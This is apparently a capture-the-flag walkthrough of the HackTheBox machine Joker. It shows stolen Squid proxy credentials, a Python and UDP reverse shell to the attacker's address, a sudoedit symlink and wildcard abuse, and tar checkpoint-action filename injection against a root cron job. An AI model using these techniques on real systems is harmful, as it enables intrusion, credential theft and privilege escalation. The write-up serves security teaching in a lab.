---
title: HTB: Joker
url: https://0xdf.gitlab.io/2020/08/13/htb-joker.html
date: 2020-08-13T10:00:00+00:00
difficulty: Hard [40]
os: Linux
tags: hackthebox, htb-joker, ctf, nmap, udp, tftp, squid, http-proxy, foxyproxy, hashcat, penglab, gobuster, python, werkzeug, iptables, socat, sudo, sudoedit, sudoedit-follow, ssh, tar, cron, wildcard, symbolic-link, checkpoint, htb-tartarsauce, htb-shrek, flask-debug
---

![Joker](https://0xdfimages.gitlab.io/img/joker-cover.png)

Rooting Joker had three steps. The first was using TFTP to get the Squid Proxy config and creds that allowed access to a webserver listening on localhost that provided a Python console. To turn that into a shell, I’ll have to enumerate the firewall and find that I can use UDP. I’ll show two ways to abuse a sudo rule to make the second step. I can take advantage of the sudoedit\_follow flag, or just abuse the wildcards in the rule. The final pivot to root exploits a cron running creating tar archives, and I’ll show three different ways to abuse it.

## Box Info

| Name | [Joker](https://hackthebox.com/machines/joker)  [Joker](https://hackthebox.com/machines/joker) [Play on HackTheBox](https://hackthebox.com/machines/joker) |
| --- | --- |
| Release Date | [19 May 2017](https://twitter.com/hackthebox_eu/status/865595366342889478) |
| Retire Date | 28 May 2017 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Joker |
| Radar Graph | Radar chart for Joker |
| First Blood User | 2 days03:17:04[del_rutherford.hoyt del\_rutherford.hoyt](https://app.hackthebox.com/users/778) |
| First Blood Root | 2 days21:19:09[del_rutherford.hoyt del\_rutherford.hoyt](https://app.hackthebox.com/users/778) |
| Creator | [eks eks](https://app.hackthebox.com/users/302) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP Proxy (3128):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.21
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-02 15:27 EDT
Nmap scan report for 10.10.10.21
Host is up (0.018s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
3128/tcp open  squid-http

Nmap done: 1 IP address (1 host up) scanned in 13.53 seconds
root@kali# nmap -p 22,3128 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.21
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-02 15:28 EDT
Nmap scan report for 10.10.10.21
Host is up (0.013s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 88:24:e3:57:10:9f:1b:17:3d:7a:f3:26:3d:b6:33:4e (RSA)
|   256 76:b6:f6:08:00:bd:68:ce:97:cb:08:e7:77:69:3d:8a (ECDSA)
|_  256 dc:91:e4:8d:d0:16:ce:cf:3d:91:82:09:23:a7:dc:86 (ED25519)
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.63 seconds

```

I also ran a run UDP scan but nothing came by with my typical “fast” scan. Given how little there is on TCP and the unreliability of UDP scans, I re-ran without pushing the `--min-rate` up and with fewer ports because it’s so slow, and find a couple ports that report open or filtered:

```

root@kali# nmap -sU --top-ports 200 -oA scans/nmap-udptop200 10.10.10.21
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-04 07:21 EDT
Nmap scan report for 10.10.10.21
Host is up (0.013s latency).
Not shown: 198 closed ports
PORT     STATE         SERVICE
69/udp   open|filtered tftp
5355/udp open|filtered llmnr

Nmap done: 1 IP address (1 host up) scanned in 216.90 seconds

```

UDP 69 is TFTP, which is useful. I tried poking at 5355, but it seems like a false positive (which is not unusual for `nmap` with UDP).

### Squid Proxy w/o Creds - TCP 3128

I’ll add this proxy to my FoxyProxy configs:

![image-20200802154739052](https://0xdfimages.gitlab.io/img/image-20200802154739052.png)

I don’t have a username and password at this time, so I’ll leave those blank. If I then try to visit any site with this on, it just hangs. If I open WireShark and look, I can see this stream:

```

[1 bytes missing in capture file].GET http://10.10.10.21/ HTTP/1.1
Host: 10.10.10.21
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

HTTP/1.1 407 Proxy Authentication Required
Server: squid/3.5.12
Mime-Version: 1.0
Date: Sun, 02 Aug 2020 19:54:30 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 3710
X-Squid-Error: ERR_CACHE_ACCESS_DENIED 0
Vary: Accept-Language
Content-Language: en-us
Proxy-Authenticate: Basic realm="kalamari"
X-Cache: MISS from joker
X-Cache-Lookup: NONE from joker:3128
Via: 1.1 joker (squid/3.5.12)
Connection: keep-alive

<html><head>
<meta type="copyright" content="Copyright (C) 1996-2015 The Squid Software Foundation and contributors">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>ERROR: Cache Access Denied</title>
...[snip]...

```

It needs creds to use the proxy.

### TFTP - UDP 69

TFTP is a difficult protocol do enumerate because it doesn’t include any kind of directory listing. I can connect and try to get files I know exist. I’ll start with `/etc/passwd`:

```

root@kali# tftp 10.10.10.21
tftp> get /etc/passwd
Error code 2: Access violation

```

`Access violation` is interesting. What about a file that doesn’t exist:

```

tftp> get /etc/0xdf
Error code 2: Access violation

```

So that’s no use. Next I started thinking about the open ports. SSH will typically accounts on the box for authentication, and I already tried `/etc/passwd`. I tried `/etc/shadow` and it unsurprisingly failed.

I googled to figure out where Squid configuration files are stored, and the top answers all suggest `/etc/squid/squid.conf`. I tried to get that, and it worked:

```

tftp> get /etc/squid/squid.conf
Received 295428 bytes in 7.2 seconds

```

About 1200 lines into the file, there’s a section on auth:

```

# We strongly recommend the following be uncommented to protect innocent
# web applications running on the proxy server who think the only
# one who can access services on "localhost" is a local user
#http_access deny to_localhost

#
# INSERT YOUR OWN RULE(S) HERE TO ALLOW ACCESS FROM YOUR CLIENTS
#
auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwords
auth_param basic realm kalamari
acl authenticated proxy_auth REQUIRED
http_access allow authenticated

# Example rule allowing access from your local networks.
# Adapt localnet in the ACL section to list your (internal) IP networks
# from where browsing should be allowed
#http_access allow localnet

# And finally deny all other access to this proxy
http_access deny all

```

Googling the line `auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwords`, it seems that `/usr/lib/squid/basic_ncsa_auth` is a program to check basic authentication, and it uses the config file passed to it for the hashes.

I’ll grab `/etc/squid/passwords`:

```

tftp> get /etc/squid/passwords
Received 48 bytes in 0.0 seconds

```

The file contains a single user and hash:

```

root@kali# cat passwords 
kalamari:$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0

```

### Crack Hash

That format starting with `$apr1$` matches nicely the Apache MD5 format from the [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page, or mode 1600. I fired up [Penglab](https://github.com/mxrch/penglab) and passed it to Hashcat with `rockyou.txt`:

![image-20200802161047427](https://0xdfimages.gitlab.io/img/image-20200802161047427.png)

It cracks the password - `kalamari: ihateseafood`.

### Enumeration Through Proxy

#### Set-Up / Theory

I’ll update FoxyProxy to include the creds:

![image-20200803055723751](https://0xdfimages.gitlab.io/img/image-20200803055723751.png)

When I enable this, every request I send will go through Joker and then to whatever I’m requesting.

Through this proxy I may have access to different things. Hypothetically, were this a real-world situation, there could be an entire network of assets only reachable through this proxy that I could explore. I could develop ways to send HTTP requests through the proxy into common IP ranges to identify hosts / ports I can now access.

For a HTB machine (especially an older one where Docker wasn’t popular yet), I’m really looking for different ways to contact the same host. One way to do this is to look for webservers on the Squid proxy itself.

#### Results

I checked 10.10.10.21, but got an error page:

![image-20200803060133938](https://0xdfimages.gitlab.io/img/image-20200803060133938.png)

Then I tried 127.0.0.1, and got something completely different:

![image-20200803060222550](https://0xdfimages.gitlab.io/img/image-20200803060222550.png)

#### Hunt for Other Ports

Before I moved on to enumerating this site, I started a loop to look for other open ports.

```

for i in {1..65535}; do 
    curl -s -U kalamari:ihateseafood -x 10.10.10.21:3128 127.0.0.1:${i} 
        | grep -q "Stylesheet for Squid Error pages" 
        || echo "$i"; 
done

```

For each port number, do a `curl` through the proxy to localhost and grep for a string I only expect on the Squid error page. `grep -q` doesn’t print the result, but then “or” (`||`) to echo the number if that `grep` failed (because I got something that wasn’t the Squid error page). This is a bit sloppy, as it will return the port if the `curl` fails for some reason, so a false positive might show up, but those can be easily checked.

80 shows up within seconds, and then it ran for a long while not finding anything else:

```

root@kali# time for i in {1..65535}; do curl -s -U kalamari:ihateseafood -x 10.10.10.21:3128 127.0.0.1:${i} | grep
 -q "Stylesheet for Squid Error pages" || echo "$i"; done
80

real    84m43.144s
user    22m35.257s
sys     42m28.505s

```

I can safely focus on port 80 for now.

### Localhost HTTP - TCP 80

#### Site

The page is a link shortener. I created a couple, and then there’s a “list” link that will show them:

![image-20200803061747991](https://0xdfimages.gitlab.io/img/image-20200803061747991.png)

Interestingly, I can’t connect to my own host through the proxy. Could be a limit on the proxy, or it could be a firewall preventing outbound traffic from Joker. I’ll keep that in mind if I get execution.

#### Directory Brute Force

I’ll run `gobuster` against the site, using the `-p` to specify the proxy string for the Squid on Joker:

```

root@kali# gobuster dir -u http://127.0.0.1 -p http://kalamari:ihateseafood@10.10.10.21:3128 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -o scans/gobuster-root-medium
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://127.0.0.1
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] Proxy:          http://kalamari:ihateseafood@10.10.10.21:3128
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/03 06:21:25 Starting gobuster
===============================================================
/list (Status: 301)
/console (Status: 200)
===============================================================
2020/08/03 06:32:59 Finished
===============================================================

```

I already had `/list` from the links on the page, but `/console` is new.

#### /console

Visiting `/console` returns a Python console in the browser:

![image-20200803062342737](https://0xdfimages.gitlab.io/img/image-20200803062342737.png)

It is running legacy Python:

![image-20200803062529999](https://0xdfimages.gitlab.io/img/image-20200803062529999.png)

The current directory is `/var/www` and has stuff referencing `shorty`:

```

>>> import os
>>> os.getcwd()
'/var/www'
>>> os.listdir('.')
['manage-shorty.py', 'testing', 'shorty']

```

The current shell is running as the werkzeug user:

```

>>> os.getlogin()
'werkzeug'

```

## Shell as werkzeug

### Failed Reverse Shell

As soon as I see code execution in this console, I’m looking to get a legit shell. I’ll start putting in the lines from a standard Python reverse shell:

```

>>> import os, pty, socket
>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
>>> s.connect(('10.10.14.13',80))

```

When I hit enter on that last line, it just disappears and nothing comes back. Very strange. I tried to reload the console, but it just hung. My best guess here is that the connection is failing (remember I couldn’t access my own host through the Squid), and then the console program breaks waiting for it. Eventually the connection times out, and the console comes back.

Figuring it could be some bug in how Python is doing it, I tried a Bash shell with Python’s `os.system`, but got the same results.

I checked to see if I could `ping` myself with `tcpdump` running on my local box:

```

>>> os.system('ping -c1 10.10.14.13')
0

```

The `ping` does make it back:

```

root@kali# tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
06:55:52.073158 IP 10.10.10.21 > 10.10.14.13: ICMP echo request, id 1432, seq 1, length 64
06:55:52.073183 IP 10.10.14.13 > 10.10.10.21: ICMP echo reply, id 1432, seq 1, length 64

```

### Enumerating Firewall

Having had issues connecting from Joker to my box twice now, so it’s time to enumerate the firewall. Before I start running loops to test what makes it out, I decided to try to print the firewall rules, and it worked:

```

[console ready]
>>> with open('/etc/iptables/rules.v4', 'r') as f: print(f.read())
# Generated by iptables-save v1.6.0 on Fri May 19 18:01:16 2017
*filter
:INPUT DROP [41573:1829596]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [878:221932]
-A INPUT -i ens33 -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -i ens33 -p tcp -m tcp --dport 3128 -j ACCEPT
-A INPUT -i ens33 -p udp -j ACCEPT
-A INPUT -i ens33 -p icmp -j ACCEPT
-A INPUT -i lo -j ACCEPT
-A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP
COMMIT
# Completed on Fri May 19 18:01:16 2017

```

It starts by setting the default for inbound as `DROP` and for outbound and forward as `ACCEPT`. Then reading from the top:
- TCP 22 inbound is allowed;
- TCP 3128 inbound is allowed;
- All UDP inbound is allowed;
- All ICMP inbound is allowed;
- All localhost inbound is allowed;
- All new TCP connections outbound are dropped.

This all fits what I’ve experienced so far.

### UDP Rev Shell

Since UDP is accepted inbound and not blocked outbound (so accepted due to the default outbound `ACCEPT`), I’ll try using commands based on [this UDP rev shell](https://github.com/infodox/python-pty-shells/blob/master/udp_pty_backconnect.py). I’ll also catch the shell with `socat` so I can go right into a PTY, rather than having to do the normal trick for that. With `socat` listening:

![image-20200803163643525](https://0xdfimages.gitlab.io/img/image-20200803163643525.png)

At `socat`:

```

root@kali# socat file:`tty`,raw,echo=0 udp-listen:53
127.0.0.1 - - [03/Aug/2020 23:55:55] "GET /console?__debugger__=yes&cmd=os.dup2(s.fileno()%2C2)&frm=0&s=p9c0pgvzQFZkepakugdO HTTP/1.1" 200 -
                                                                                                                                            werkzeug@joker:~$ id
uid=1000(werkzeug) gid=1000(werkzeug) groups=1000(werkzeug)
werkzeug@joker:~$

```

## Priv: werkzeug –> alekos

### Enumeration

Before I run enumeration scripts, I always check `sudo`, and there’s an entry:

```

werkzeug@joker:/home/alekos$ sudo -l
Matching Defaults entries for werkzeug on joker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    sudoedit_follow, !sudoedit_checkdir

User werkzeug may run the following commands on joker:
    (alekos) NOPASSWD: sudoedit /var/www/*/*/layout.html

```

`sudoedit` is a shortcut for running `sudo` with the `-e` flag:

> The **-e** (*edit*) option indicates that, instead of running a command, the user wishes to edit one or more files. In lieu of a command, the string “sudoedit” is used when consulting the security policy. If the user is authorized by the policy, the following steps are taken:
>
> 1. Temporary copies are made of the files to be edited with the owner set to the invoking user.
> 2. The editor specified by the policy is run to edit the temporary files. The *sudoers* policy uses the SUDO\_EDITOR, VISUAL and EDITOR environment variables (in that order). If none of SUDO\_EDITOR, VISUAL or EDITOR are set, the first program listed in the *editor* **[sudoers](https://linux.die.net/man/5/sudoers)**(5) option is used.
> 3. If they have been modified, the temporary files are copied back to their original location and the temporary versions are removed.
>
> If the specified file does not exist, it will be created. Note that unlike most commands run by *sudo*, the editor is run with the invoking user’s environment unmodified. If, for some reason, **sudo** is unable to update a file with its edited version, the user will receive a warning and the edited copy will remain in a temporary file.

In fact, `sudoedit` is a shortcut to `sudo`:

```

werkzeug@joker:~/testing/0xdf$ which sudoedit
/usr/bin/sudoedit
werkzeug@joker:~/testing/0xdf$ ls -l /usr/bin/sudoedit 
lrwxrwxrwx 1 root root 4 Oct 17  2016 /usr/bin/sudoedit -> sudo

```

I’ll show two ways to exploit this `sudo` configuration.

### Exploit #1 - sudoedit\_follow

#### Background

`searchsploit` shows a vulnerability in `sudo` / `sudoexit` for version 1.8.14:

```

root@kali# searchsploit sudoedit
---------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                              |  Path
---------------------------------------------------------------------------- ---------------------------------
(Tod Miller's) Sudo/SudoEdit 1.6.9p21/1.7.2p4 - Local Privilege Escalation  | multiple/local/11651.sh
Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escal | linux/local/37710.txt
SudoEdit 1.6.8 - Local Change Permission                                    | linux/local/470.c
---------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

I’ll use `searchsploit -x linux/local/37710.txt` to read the exploit, and it basically says that in `sudo` version less than and equal to 1.8.14, it doesn’t check the full path when a wildcard is used twice, which means that symbolic links can be used to get access to files that perhaps the person writing the config didn’t want.

Joker has `sudo` version 1.8.16:

```

werkzeug@joker:~/testing/0xdf$ sudo --version
Sudo version 1.8.16
Sudoers policy plugin version 1.8.16
Sudoers file grammar version 45
Sudoers I/O plugin version 1.8.16

```

When this was patched in version 1.8.15, they introduced the `sudoedit_follow` flag. From the [sudoers man page](https://www.sudo.ws/man/1.8.15/sudoers.man.html):

> Starting with version 1.8.15, `sudoedit` will not follow symbolic links when opening files unless the *sudoedit\_follow* option is enabled. The *FOLLOW* and *NOFOLLOW* tags override the value of *sudoedit\_follow* and can be used to permit (or deny) the editing of symbolic links on a per-command basis. These tags are only effective for the *sudoedit* command and are ignored for all other commands.

So in order to not break the behavior if someone really wanted that, the `sudoedit_follow` flag allows it to behave like the version 1.8.14 and before. And that flag is present in this config.

Now I just have to drop a symlink to where I want to write as `layout.html`, and I should be able to edit.

#### Exploit

I’ll make a directory in the `/var/www/testing` directory, `0xdf`. In there, I’ll drop a symbolic link to the a file I want to write as alekos, the user’s `authorized_keys` file.

```

werkzeug@joker:~/testing$ mkdir 0xdf
werkzeug@joker:~/testing/0xdf$ ln -s /home/alekos/.ssh/authorized_keys layout.html
werkzeug@joker:~/testing/0xdf$ ls -l
total 0
lrwxrwxrwx 1 werkzeug werkzeug 33 Aug  4 03:53 layout.html -> /home/alekos/.ssh/authorized_keys

```

Now I can `sudoedit` the file with `sudoedit -u alekos /var/www/testing/0xdf/layout.html`. It opens a blank file in `nano`, so I’ll paste in my public SSH key.

### Exploit #2 - Wildcard Abuse

The command I can run is `sudoedit /var/www/*/*/layout.html`. What if I let the `*/*` be `[space].ssh/authorized_keys[space]`. The command then becomes `sudoedit /var/www/ .ssh/authorized_keys /layout.html`, which will try to open three files to edit. The first, `/var/www/` will fail because it’s a directory. The second will open, and the third will allow me to edit the temporary file, but then won’t be able to write `layout.html` at the system root.

I’ll use this to drop a public key into the `authorized_keys` file just like above.

### SSH

Either way I update the `authorized_keys` file, I can connect over SSH:

```

root@kali# ssh -i ~/keys/ed25519_gen alekos@10.10.10.21
The authenticity of host '10.10.10.21 (10.10.10.21)' can't be established.
ECDSA key fingerprint is SHA256:1yj4blzJwO5TYIZYFB3HMwXEqeflHc2iF1Idp3lZ94k.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.21' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.10 (GNU/Linux 4.8.0-52-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Sat May 20 16:38:08 2017 from 10.10.13.210
alekos@joker:~$

```

And grab `user.txt`:

```

alekos@joker:~$ cat user.txt
a2981211************************

```

## Priv: alekos –> root

### Enumeration

Besides `user.txt`, there are two directories in alekos’ home directory:

```

alekos@joker:~$ ls
backup  development  user.txt

```

`backup` holds a bunch of `.tar.gz` files:

```

alekos@joker:~/backup$ ls 
dev-1514134201.tar.gz  dev-1596489901.tar.gz  dev-1596492901.tar.gz  dev-1596495901.tar.gz  dev-1596498901.tar.gz  dev-1596501901.tar.gz  dev-1596504901.tar.gz
dev-1514134501.tar.gz  dev-1596490201.tar.gz  dev-1596493201.tar.gz  dev-1596496201.tar.gz  dev-1596499201.tar.gz  dev-1596502201.tar.gz  dev-1596505201.tar.gz
dev-1596487501.tar.gz  dev-1596490501.tar.gz  dev-1596493501.tar.gz  dev-1596496501.tar.gz  dev-1596499501.tar.gz  dev-1596502501.tar.gz  dev-1596505501.tar.gz
dev-1596487801.tar.gz  dev-1596490801.tar.gz  dev-1596493801.tar.gz  dev-1596496801.tar.gz  dev-1596499801.tar.gz  dev-1596502801.tar.gz  dev-1596505801.tar.gz
dev-1596488101.tar.gz  dev-1596491101.tar.gz  dev-1596494101.tar.gz  dev-1596497101.tar.gz  dev-1596500101.tar.gz  dev-1596503101.tar.gz  dev-1596506101.tar.gz
dev-1596488401.tar.gz  dev-1596491401.tar.gz  dev-1596494401.tar.gz  dev-1596497401.tar.gz  dev-1596500401.tar.gz  dev-1596503401.tar.gz  dev-1596506401.tar.gz
dev-1596488701.tar.gz  dev-1596491701.tar.gz  dev-1596494701.tar.gz  dev-1596497701.tar.gz  dev-1596500701.tar.gz  dev-1596503701.tar.gz
dev-1596489001.tar.gz  dev-1596492001.tar.gz  dev-1596495001.tar.gz  dev-1596498001.tar.gz  dev-1596501001.tar.gz  dev-1596504001.tar.gz
dev-1596489301.tar.gz  dev-1596492301.tar.gz  dev-1596495301.tar.gz  dev-1596498301.tar.gz  dev-1596501301.tar.gz  dev-1596504301.tar.gz
dev-1596489601.tar.gz  dev-1596492601.tar.gz  dev-1596495601.tar.gz  dev-1596498601.tar.gz  dev-1596501601.tar.gz  dev-1596504601.tar.gz

```

The file name is incrementing by 300 each time. Looking at `-l`, I can see from the dates that the files are created every five minutes (or 300 seconds). The files are all owned by root, with a group of alekos.

Despite the `.tar.gz` extension, the files are just `.tar` archives:

```

alekos@joker:~/backup$ file dev-1596506701.tar.gz
dev-1596506701.tar.gz: POSIX tar archive (GNU)

```

Looking at one of the archives, it contains a bunch of Python code:

```

alekos@joker:~/backup$ tar tvf dev-1596506701.tar.gz
-rw-r----- alekos/alekos     0 2017-05-18 19:01 __init__.py
-rw-r----- alekos/alekos  1452 2017-05-18 19:01 application.py
drwxrwx--- alekos/alekos     0 2017-05-18 19:01 data/
-rw-r--r-- alekos/alekos 12288 2017-05-18 19:01 data/shorty.db
-rwxrwx--x alekos/alekos   781 2020-08-04 04:41 df
-rw-r----- alekos/alekos   997 2017-05-18 19:01 models.py
drwxr-x--- alekos/alekos     0 2017-05-18 19:01 static/
-rw-r----- alekos/alekos  1585 2017-05-18 19:01 static/style.css
drwxr-x--- alekos/alekos     0 2017-05-18 19:01 templates/
-rw-r----- alekos/alekos   524 2017-05-18 19:01 templates/layout.html
-rw-r----- alekos/alekos   231 2017-05-18 19:01 templates/not_found.html
-rw-r----- alekos/alekos   725 2017-05-18 19:01 templates/list.html
-rw-r----- alekos/alekos   193 2017-05-18 19:01 templates/display.html
-rw-r----- alekos/alekos   624 2017-05-18 19:01 templates/new.html
-rw-r----- alekos/alekos  2500 2017-05-18 19:01 utils.py
-rw-r----- alekos/alekos  1748 2017-05-18 19:01 views.py

```

These look like the same files that are in `development`:

```

alekos@joker:~/development$ find . -type f
./data/shorty.db
./templates/layout.html
./templates/not_found.html
./templates/list.html
./templates/display.html
./templates/new.html
./__init__.py
./views.py
./models.py
./application.py
./static/style.css
./utils.py

```

It looks like root is is creating a new archive every five minutes with the contents of the `development` directory, likely using a `*`.

### Exploit #1 - File Read as Root via Symbolic Link

As I believe that root is running `tar` on the `development` directory every five minutes, I’ll just move the `development` directory and replace it with a symbolic link pointing to `/root`:

```

alekos@joker:~$ mv development{,.orig}
alekos@joker:~$ ln -s /root development
alekos@joker:~$ ls -l 
total 20
drwxrwx--- 2 root   alekos 12288 Aug  4 04:20 backup
lrwxrwxrwx 1 alekos alekos     5 Aug  4 04:22 development -> /root
drwxr-x--- 5 alekos alekos  4096 May 18  2017 development.orig
-r--r----- 1 root   alekos    33 May 19  2017 user.txt

```

Now when it runs, I’ll look in the result:

```

alekos@joker:~/backup$ tar xvf dev-1596504301.tar.gz -C /tmp/
backup.sh
root.txt

```

I can read the flag:

```

alekos@joker:~/backup$ cat /tmp/root.txt
d452b7fa************************

```

I could also grab files like `/etc/shadow` and try to break the root password.

### Exploit #2 - –checkpoint

#### Background

[gtfobins](https://gtfobins.github.io/gtfobins/tar/) shows how to get execution out of `tar`. My favorite is the `--to-command` flag, but that only works on extracting, and this job is creating an archive (I showed that in [TarTarSauce](/2018/10/20/htb-tartarsauce.html#to-command)). The other strategy is to use the flags `--checkpoint=1` and `--checkpoint-action=exec=[thing to run]`.

I just wrote a couple weeks ago in [Shrek](/2020/07/22/htb-shrek.html#chown-wildcard-exploit) about a relatively famous [paper about exploiting wildcards](https://www.exploit-db.com/papers/33930). In Shrek, it was exploiting `chown`, and here, `tar`. The short story is that when the shell sees a `*`, it expands it out to all the files space separated. If I can make a filename that is actually an option for the program calling it, it will be handled as an option.

#### Prep

First, I’ll need a reverse shell. I’ll copy the UDP Python shell to the box using `scp`:

```

root@kali# scp -i ~/keys/ed25519_gen rev.py alekos@10.10.10.21:/home/alekos/development/df   
rev.py                                        100%  781    63.4KB/s   00:00    

```

I’ll set it executable, and test it just by running it to ensure I get a shell:

```

alekos@joker:~$ chmod +x development/df 
alekos@joker:~$ development/df

```

I do.

#### Exploit

I’ll go into the `backup` directory and use `touch` to create two files. The first is `--checkpoint=1`. This will trigger the checkpoint action on the first record added to the archive:

```

alekos@joker:~/development$ touch -- --checkpoint=1   

```

The second is `--checkpoint-action=exec=python df`. This will tell `tar` to run `df` when it reaches a checkpoint:

```

alekos@joker:~/development$ touch -- '--checkpoint-action=exec=python df'

```

In both cases, I use `--` to tell the shell that nothing after that is an argument, but a filename. It’s a good shorthand to create weird files, and a good protection that if used in this cron, would prevent this method of exploitation.

#### Shell

When the five minute mark rolls around, I get a shell on `socat`:

```

root@kali# socat file:`tty`,raw,echo=0 udp-listen:443
root@joker:/home/alekos/development# id
uid=0(root) gid=0(root) groups=0(root)

```

### Exploit #3 - Break Cron

#### Theory

I always like to look at the automation on boxes. In this case, `/root/backup.sh` is running every five minutes:

```

root@joker:~# crontab -l
...[snip]...
*/5 * * * * /root/backup.sh

```

The script follows:

```

root@joker:~# cat backup.sh 
#!/bin/sh

FILENAME="dev-$(date +%s).tar.gz"

cd /home/alekos/development;
tar cf /home/alekos/backup/$FILENAME *;
chown root:alekos /home/alekos/backup/$FILENAME;
chmod 640 /home/alekos/backup/$FILENAME;

```

It changes into the `development` directory, runs `tar cf` on `*`, then changes the owner, group, and permissions.

But what if that first `cd` fails? The directory would stay in `/root`, and then it would run `tar cf` to compress everything and drop the archive into the same filename.

#### Exploit

I’ll move the `development` directory to something else:

```

alekos@joker:~$ mv development{,.orig}
alekos@joker:~$ ls
backup  development.orig  user.txt

```

Now when a new archive is created, it has the contents of `/root`:

```

alekos@joker:~/backup$ tar tvf dev-1596506401.tar.gz 
-rwx------ root/root       205 2017-05-18 19:25 backup.sh
-r-------- root/root        33 2017-05-19 17:57 root.txt

```